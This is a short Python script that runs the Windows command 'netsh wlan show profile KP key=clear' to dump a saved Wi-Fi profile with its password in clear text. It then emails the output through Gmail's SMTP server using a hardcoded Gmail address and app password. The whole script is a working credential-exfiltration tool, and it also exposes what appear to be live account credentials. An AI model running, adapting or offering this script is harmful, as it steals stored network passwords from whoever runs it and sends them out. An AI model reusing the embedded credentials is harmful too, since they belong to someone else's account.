import subprocess
import smtplib

def sendmail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)  # Send message to self
    server.quit()
        


    
command = "netsh wlan show profile KP key=clear"
result = subprocess.check_output(command, shell=True, text=True)
    
    # Send the output as an email
sender_email = "kaushalpjpt1004@gmail.com"
app_password = "zild pdkk zhrq yfkd"  # Replace with your app-specific password
sendmail(sender_email, app_password, result)

